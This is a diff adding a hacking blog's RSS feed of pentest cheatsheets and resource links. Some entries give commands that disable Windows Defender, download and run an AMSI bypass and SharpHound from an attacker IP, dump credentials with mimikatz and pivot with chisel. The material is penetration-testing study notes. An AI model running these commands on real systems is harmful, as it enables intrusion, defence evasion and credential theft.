@@ -1,0 +1,807 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ceso Adventures</title><link>https://ceso.github.io/</link><description>Recent content on Ceso Adventures</description><generator>Hugo</generator><language>en-gb</language><lastBuildDate>Fri, 03 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>README !</title><link>https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/readme/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/readme/</guid><description>&lt;p&gt;Antivirus tend to flag malware by Signature/Heuristics detection, we could bypass these throughout certain techniques
+For more details, look up into the [Exploit Development/Reversing/AV|EDR Bypass](&lt;a href="https://ceso.github.io/2020/12/hacking-resources/#exploit-developmentreversingAV"&gt;https://ceso.github.io/2020/12/hacking-resources/#exploit-developmentreversingAV&lt;/a&gt;|EDR Bypass) Section on the resources part of my blog.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id="if-not-av-bypass-and-admin-disable-defender"&gt;If NOT AV Bypass and Admin, DISABLE Defender&lt;/h1&gt;
+&lt;p&gt;If we have admin creds, we could disable Win Defender, please note THIS IS NEVER a good idea in production environments as this can be monitored!!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;# Query &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; there is already an excluded path
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Get-MpPreference | select-object -ExpandProperty ExclusionPath
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;# Disable real time monitoring
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set-MpPreference -DisableRealtimeMonitoring $true
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;# Exclude temp dir from monitoring by defender
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Add-MpPreference -ExclusionPath &amp;#34;C:\windows\temp&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;# Disable Defender ONLY &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; downloaded files
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set-MpPreference -DisableIOAVProtection $true
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;# Or REMOVE ALL Signature&lt;span style="color:#960050;background-color:#1e0010"&gt;&amp;#39;&lt;/span&gt;s but leave it enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &amp;#34;C:\Program Files\Windows Defender\MpCmdRun.exe&amp;#34; -RemoveDefinitions -All
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>README !</title><link>https://ceso.github.io/cheatsheets/hacking/pivoting/readme/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/pivoting/readme/</guid><description>&lt;p&gt;It&amp;rsquo;s possible to do pivoting by using proxychains, pure nc&amp;rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&amp;rsquo;s a transparent proxy server that works like &amp;ldquo;a vpn&amp;rdquo;, and doesn&amp;rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&amp;rsquo;t work through sshuttle.&lt;/p&gt;</description></item><item><title>(Simple) Buffer Overflow (32 bits, NO ASLR and NO DEP)</title><link>https://ceso.github.io/cheatsheets/hacking/memory_exploitation/simple_buffer_overflow/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/memory_exploitation/simple_buffer_overflow/</guid><description>&lt;ul&gt;
+&lt;li&gt;0 - Crash the application&lt;/li&gt;
+&lt;li&gt;1 - Fuzzing (find aprox number of bytes where the crash took place)&lt;/li&gt;
+&lt;li&gt;2 - Find offset&lt;/li&gt;
+&lt;li&gt;3 - EIP control&lt;/li&gt;
+&lt;li&gt;4 - Check for enough space on buffer&lt;/li&gt;
+&lt;li&gt;5 - Badchars counting&lt;/li&gt;
+&lt;li&gt;6 - Find return address (JMP ESP)&lt;/li&gt;
+&lt;li&gt;7 - Create payload&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="fuzzing-example-with-vulnserver--spike-on-trun-command"&gt;Fuzzing: example with vulnserver + spike on TRUN command&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat &amp;gt; trun.spk &amp;lt;&amp;lt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;s_readline();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;s_string(&amp;#34;TRUN &amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;s_string_variable(&amp;#34;COMMAND&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, start wireshark filtering on the target IP/PORT below and run the &lt;code&gt;trun.spk&lt;/code&gt;:&lt;/p&gt;</description></item><item><title>AMSI</title><link>https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/amsi/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/amsi/</guid><description>&lt;p&gt;AMSI (Anti-Malware Scan Interface), in short sit&amp;rsquo;s between Powershell and Defender, so even if our crafted malware/tools have an AV Bypass, it still can be flagged by AMSI (annoying!), AMSI can also be leveraged for example for EDR&amp;rsquo;s. There are certain ways to bypass AMSI, for example forcing it to fail.&lt;/p&gt;
+&lt;hr&gt;</description></item><item><title>BloodHound</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/</guid><description>&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$attacker=&lt;span style="color:#e6db74"&gt;&amp;#34;192.168.42.37&amp;#34;&lt;/span&gt;;$domain=&lt;span style="color:#e6db74"&gt;&amp;#34;example.com&amp;#34;&lt;/span&gt;;IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/4msibyp455.ps1&amp;#34;&lt;/span&gt;);IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/SharpHound.ps1&amp;#34;&lt;/span&gt;);Invoke-BloodHound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain $domain
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Brute Force</title><link>https://ceso.github.io/resources/tools/brute_force/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/tools/brute_force/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/Coalfire-Research/npk"&gt;https://github.com/Coalfire-Research/npk&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;mdash; Distributed hash-cracking platform on serverless AWS componentes&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://hashcat.net/wiki/doku.php?id=example_hashes"&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/danielmiessler/SecLists"&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/rapid7/ssh-badkeys"&gt;https://github.com/rapid7/ssh-badkeys&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://crackstation.net/"&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Buffer Overflows</title><link>https://ceso.github.io/resources/exploit_development/buffer_overflows/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/exploit_development/buffer_overflows/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/justinsteven/dostackbufferoverflowgood"&gt;https://github.com/justinsteven/dostackbufferoverflowgood&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/stephenbradshaw/vulnserver"&gt;https://github.com/stephenbradshaw/vulnserver&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.vulnhub.com/entry/brainpan-1,51/"&gt;https://www.vulnhub.com/entry/brainpan-1,51/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://exploit.education/phoenix/"&gt;https://exploit.education/phoenix/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=1S0aBV-Waeo"&gt;https://www.youtube.com/watch?v=1S0aBV-Waeo&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Bug Bounty &amp; Web Security</title><link>https://ceso.github.io/resources/general_hacking/bug_bounty_web_sec/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/general_hacking/bug_bounty_web_sec/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://owasp.org/www-project-top-ten/"&gt;https://owasp.org/www-project-top-ten/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.hackerone.com/blog/Guide-Subdomain-Takeovers"&gt;https://www.hackerone.com/blog/Guide-Subdomain-Takeovers&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://0xpatrik.com/subdomain-takeover-ns/"&gt;https://0xpatrik.com/subdomain-takeover-ns/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/OWASP/wstg"&gt;https://github.com/OWASP/wstg&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/"&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf"&gt;https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8"&gt;https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/ngalongc/bug-bounty-reference"&gt;https://github.com/ngalongc/bug-bounty-reference&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gowsundar.gitbook.io/book-of-bugbounty-tips"&gt;https://gowsundar.gitbook.io/book-of-bugbounty-tips&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/jdonsec/AllThingsSSRF"&gt;https://github.com/jdonsec/AllThingsSSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/jdonsec/AllThingsXXE"&gt;https://github.com/jdonsec/AllThingsXXE&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://xsleaks.com/"&gt;https://xsleaks.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/"&gt;https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/"&gt;https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.usejournal.com/bug-hunting-methodology-part-1-91295b2d2066"&gt;https://blog.usejournal.com/bug-hunting-methodology-part-1-91295b2d2066&lt;/a&gt; **&amp;lt;&amp;mdash;&amp;mdash; Serie of 3 post about Bug Hunting Methodology **&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/ngalongc/bug-bounty-reference"&gt;https://github.com/ngalongc/bug-bounty-reference&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://pentester.land/list-of-bug-bounty-writeups.html"&gt;https://pentester.land/list-of-bug-bounty-writeups.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://twitter.com/FaniMalikHack/status/1355145481479999488"&gt;https://twitter.com/FaniMalikHack/status/1355145481479999488&lt;/a&gt; **&amp;lt;&amp;mdash;&amp;mdash; Tweet by @FaniMalikHack with an infographic about JWT **&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Cheatshees/Aricles/Podcasts</title><link>https://ceso.github.io/resources/general_hacking/cheatsheets_articles_podcats/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/general_hacking/cheatsheets_articles_podcats/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/chvancooten/OSEP-Code-Snippets"&gt;https://github.com/chvancooten/OSEP-Code-Snippets&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;- OSEP Code Snippets!&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md"&gt;https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads"&gt;https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/"&gt;https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/Optixal/OSCP-PWK-Notes-Public/"&gt;https://github.com/Optixal/OSCP-PWK-Notes-Public/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/"&gt;https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/OlivierLaflamme/Cheatsheet-God/"&gt;https://github.com/OlivierLaflamme/Cheatsheet-God/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/sinfulz/JustTryHarder/"&gt;https://github.com/sinfulz/JustTryHarder/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/0x4D31/awesome-oscp"&gt;https://github.com/0x4D31/awesome-oscp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/xapax/security"&gt;https://github.com/xapax/security&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://book.hacktricks.xyz/"&gt;https://book.hacktricks.xyz/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html"&gt;https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html"&gt;https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/Hack-with-Github/Awesome-Hacking"&gt;https://github.com/Hack-with-Github/Awesome-Hacking&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://jhalon.github.io/becoming-a-pentester/"&gt;https://jhalon.github.io/becoming-a-pentester/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.inteltechniques.com/podcast.html"&gt;https://www.inteltechniques.com/podcast.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://darknetdiaries.com/"&gt;https://darknetdiaries.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463"&gt;https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Chisel</title><link>https://ceso.github.io/cheatsheets/hacking/pivoting/chisel/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/pivoting/chisel/</guid><description>&lt;p&gt;If we have Chisel with remote port forward from machine in the net:&lt;/p&gt;
+&lt;p&gt;On attacker machine I start up a chisel reverse server on port 9050 (imagine this machine IP is 192.168.90.90)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;server -p 9050 --reverse
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On compromised machine in the network I start a client connection against the server running in the attacker.
+The command below will be forwarding the traffic from port 8081 in the machine 172.16.42.90 throughout the compromised machine (via localhost in port 5050) to the attacker.&lt;/p&gt;</description></item><item><title>Cloud</title><link>https://ceso.github.io/resources/labs/cloud/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/labs/cloud/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/nccgroup/sadcloud"&gt;https://github.com/nccgroup/sadcloud&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/ine-labs/AWSGoat"&gt;https://github.com/ine-labs/AWSGoat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/ine-labs/AzureGoat"&gt;https://github.com/ine-labs/AzureGoat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/ine-labs/GCPGoat"&gt;https://github.com/ine-labs/GCPGoat&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Compiling</title><link>https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/</guid><description>&lt;h1 id="arch-cross-compile-exploit-and-diff-glibc-version"&gt;Arch cross compile exploit (and diff glibc version)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Compiling</title><link>https://ceso.github.io/resources/exploit_development/compiling/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/exploit_development/compiling/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage"&gt;https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html"&gt;https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/"&gt;https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Exploitation</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/</guid><description>&lt;h1 id="list-all-available-credentials-cached-hashes-and-passwords-logged-on-user-and-computer"&gt;List all available credentials cached (Hashes and Passwords; Logged on user and computer)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mimikatz.exe &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="convert-to-ccache"&gt;Convert to ccache&lt;/h1&gt;
+&lt;p&gt;We can use the tool &lt;code&gt;ticket_converter&lt;/code&gt; written by &lt;code&gt;zer1t0&lt;/code&gt; for converting kirbi tickets to ccache and viceversa:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Convert from b64 encoded blob to kirbi:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [IO.File]::WriteAllBytes(&amp;#34;C:\fullpathtoticket.kirbi&amp;#34;, [Convert]::FromBase64String(&amp;#34;aa…&amp;#34;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Convert the .kiribi to .ccache:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; python ticket_converter.py ticket.ccache ticket.kirbi
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Copy the ccache to our attacker machine and export the KRB5CCNAME variable:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; export KRB5CCNAME=/path/to/ticket.ccache
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="genericall"&gt;GenericAll&lt;/h1&gt;
+&lt;p&gt;_TODO&lt;/p&gt;</description></item><item><title>FTP</title><link>https://ceso.github.io/cheatsheets/hacking/exfiltration/ftp/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/exfiltration/ftp/</guid><description>&lt;p&gt;If there is an ftp server which we have access, we can upload files there through it, the &amp;quot;&amp;quot; is the same for both, windows or linux:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Connect and login with:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;ftp 192.168.42.42
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Upload the files with:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;put evil.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Sometimes is needed to enter in passive mode before doing anything, if is the case, just type:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;pass
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;followed by enter
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>General</title><link>https://ceso.github.io/resources/labs/general/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/labs/general/</guid><description>&lt;h1 id="general-hackingctf"&gt;General Hacking/CTF&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://hackthebox.eu/"&gt;https://hackthebox.eu/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.vulnhub.com/"&gt;https://www.vulnhub.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="kubernetes"&gt;Kubernetes&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/madhuakula/kubernetes-goat"&gt;https://github.com/madhuakula/kubernetes-goat&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="web"&gt;Web&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/OWASP/NodeGoat"&gt;https://github.com/OWASP/NodeGoat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://owasp.org/www-project-juice-shop/"&gt;https://owasp.org/www-project-juice-shop/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://portswigger.net/web-security"&gt;https://portswigger.net/web-security&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>General</title><link>https://ceso.github.io/resources/red_team/general/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/red_team/general/</guid><description>&lt;ul&gt;
